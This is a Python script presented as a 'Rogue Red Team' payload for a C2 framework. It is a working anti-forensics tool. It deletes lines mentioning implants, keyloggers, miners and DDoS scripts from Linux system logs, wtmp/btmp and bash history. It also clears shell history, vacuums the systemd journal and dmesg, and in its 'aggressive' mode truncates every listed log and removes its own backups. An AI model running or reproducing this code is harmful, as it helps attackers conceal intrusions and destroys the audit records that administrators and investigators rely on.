#!/usr/bin/env python3
"""
PAYLOAD: Log Cleaner
DESCRIPTION: Removes forensic traces from system logs
AUTHOR: Rogue Red Team
VERSION: 2.0
SECURITY: This tool modifies system logs - Use only on authorized systems
"""
import os, sys, re, subprocess, datetime, json, hashlib

class LogCleaner:
    def __init__(self, implant_id=None):
        self.implant_id = implant_id or self.get_implant_id()
        self.log_patterns = [
            r'rogue_implant',
            r'rogue_agent',
            r'systemd-journald.*python',
            r'python3.*\.cache/\.rogue',
            r'polyloader',
            r'ddos\.py',
            r'mine\.py',
            r'keylogger',
            r'screenshot',
            self.implant_id
        ]
        
        # System log files to clean
        self.log_files = {
            'linux': [
                '/var/log/auth.log',
                '/var/log/syslog',
                '/var/log/messages',
                '/var/log/secure',
                '/var/log/kern.log',
                '/var/log/dmesg',
                '/var/log/boot.log',
                '/var/log/cron',
                '/var/log/maillog',
                '/var/log/spooler',
                '/var/log/lastlog',
                '/var/log/wtmp',
                '/var/log/btmp',
                '/var/log/utmp',
                '/var/log/faillog'
            ],
            'bash_history': [
                os.path.expanduser('~/.bash_history'),
                '/root/.bash_history'
            ],
            'application_logs': [
                os.path.expanduser('~/.cache/.rogue/.implant.log')
            ]
        }
    
    def get_implant_id(self):
        """Generate implant identifier for pattern matching"""
        import socket, getpass
        hostname = socket.gethostname()
        username = getpass.getuser()
        return hashlib.md5(f"{hostname}_{username}".encode()).hexdigest()[:8]
    
    def clean_file(self, filepath):
        """Remove matching lines from a file"""
        if not os.path.exists(filepath):
            return {"file": filepath, "status": "not_found"}
        
        try:
            with open(filepath, 'r') as f:
                lines = f.readlines()
            
            original_count = len(lines)
            
            # Filter out lines matching any pattern
            new_lines = []
            for line in lines:
                if not any(re.search(pattern, line, re.IGNORECASE) for pattern in self.log_patterns):
                    new_lines.append(line)
            
            removed_count = original_count - len(new_lines)
            
            if removed_count > 0:
                # Backup original file
                backup_path = f"{filepath}.rogue_backup"
                if not os.path.exists(backup_path):
                    with open(backup_path, 'w') as f:
                        f.writelines(lines)
                
                # Write cleaned file
                with open(filepath, 'w') as f:
                    f.writelines(new_lines)
                
                return {
                    "file": filepath,
                    "status": "cleaned",
                    "removed": removed_count,
                    "backup": backup_path
                }
            else:
                return {
                    "file": filepath,
                    "status": "no_matches",
                    "removed": 0
                }
                
        except Exception as e:
            return {
                "file": filepath,
                "status": "error",
                "error": str(e)
            }
    
    def clean_bash_history(self):
        """Clean bash history files"""
        results = []
        
        for history_file in self.log_files['bash_history']:
            if os.path.exists(history_file):
                result = self.clean_file(history_file)
                results.append(result)
                
                # Also clear current session history
                if history_file == os.path.expanduser('~/.bash_history'):
                    subprocess.call('history -c', shell=True)
                    subprocess.call('history -w', shell=True)
        
        return results
    
    def clean_system_logs(self):
        """Clean system log files"""
        results = []
        
        for log_file in self.log_files['linux']:
            result = self.clean_file(log_file)
            results.append(result)
        
        return results
    
    def clean_application_logs(self):
        """Clean application-specific logs"""
        results = []
        
        for log_file in self.log_files['application_logs']:
            result = self.clean_file(log_file)
            results.append(result)
        
        return results
    
    def clear_memory_logs(self):
        """Clear log-related memory"""
        results = []
        
        try:
            # Clear systemd journal
            if os.path.exists('/bin/journalctl'):
                subprocess.call('journalctl --vacuum-time=1s 2>/dev/null', shell=True)
                subprocess.call('journalctl --rotate 2>/dev/null', shell=True)
                results.append({
                    "action": "systemd_journal_clear",
                    "status": "success"
                })
            
            # Clear dmesg
            subprocess.call('dmesg -c 2>/dev/null', shell=True)
            results.append({
                "action": "dmesg_clear",
                "status": "success"
            })
            
        except Exception as e:
            results.append({
                "action": "memory_logs_clear",
                "status": "error",
                "error": str(e)
            })
        
        return results
    
    def execute(self, clean_level="aggressive"):
        """Execute log cleaning based on level"""
        results = {
            "timestamp": datetime.datetime.now().isoformat(),
            "clean_level": clean_level,
            "operations": []
        }
        
        try:
            print("[+] Starting log cleaning operations...")
            
            # Always clean application logs
            print("[+] Cleaning application logs...")
            app_results = self.clean_application_logs()
            results["operations"].extend(app_results)
            
            # Clean bash history
            print("[+] Cleaning bash history...")
            bash_results = self.clean_bash_history()
            results["operations"].extend(bash_results)
            
            if clean_level in ["moderate", "aggressive"]:
                print("[+] Cleaning system logs...")
                sys_results = self.clean_system_logs()
                results["operations"].extend(sys_results)
            
            if clean_level == "aggressive":
                print("[+] Clearing memory logs...")
                mem_results = self.clear_memory_logs()
                results["operations"].extend(mem_results)
                
                # Additional aggressive measures
                print("[+] Performing aggressive cleanup...")
                aggressive_results = self.aggressive_cleanup()
                results["operations"].extend(aggressive_results)
            
            # Generate summary
            total_cleaned = sum(op.get("removed", 0) for op in results["operations"] if isinstance(op, dict))
            total_errors = sum(1 for op in results["operations"] if isinstance(op, dict) and op.get("status") == "error")
            
            results["summary"] = {
                "total_operations": len(results["operations"]),
                "total_lines_removed": total_cleaned,
                "total_errors": total_errors
            }
            
            print(f"[+] Log cleaning complete. Removed {total_cleaned} lines across {len(results['operations'])} files.")
            
            # Save results
            output_dir = os.path.expanduser("~/.cache/.rogue/cleanup")
            os.makedirs(output_dir, exist_ok=True)
            
            output_file = os.path.join(output_dir, f"logclean_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=2, default=str)
            
            return json.dumps(results["summary"], indent=2)
            
        except Exception as e:
            return f"[!] Log cleaning failed: {str(e)}"
    
    def aggressive_cleanup(self):
        """Additional aggressive cleanup measures"""
        results = []
        
        try:
            # Overwrite log files with null data
            for log_file in self.log_files['linux']:
                if os.path.exists(log_file):
                    try:
                        # Truncate file
                        open(log_file, 'w').close()
                        results.append({
                            "file": log_file,
                            "action": "truncated",
                            "status": "success"
                        })
                    except:
                        pass
            
            # Remove backup files
            import glob
            backup_files = glob.glob("/var/log/*.rogue_backup") + glob.glob("~/.cache/.rogue/*.backup")
            for backup in backup_files:
                try:
                    os.remove(backup)
                    results.append({
                        "file": backup,
                        "action": "backup_removed",
                        "status": "success"
                    })
                except:
                    pass
                    
        except Exception as e:
            results.append({
                "action": "aggressive_cleanup",
                "status": "error",
                "error": str(e)
            })
        
        return results

def rogue_integration():
    """Wrapper for Rogue C2 integration"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Rogue Log Cleaner')
    parser.add_argument('--level', choices=['light', 'moderate', 'aggressive'], 
                       default='moderate', help='Cleaning intensity level')
    
    args, unknown = parser.parse_known_args()
    
    cleaner = LogCleaner()
    return cleaner.execute(clean_level=args.level)

if __name__ == "__main__":
    print(rogue_integration())
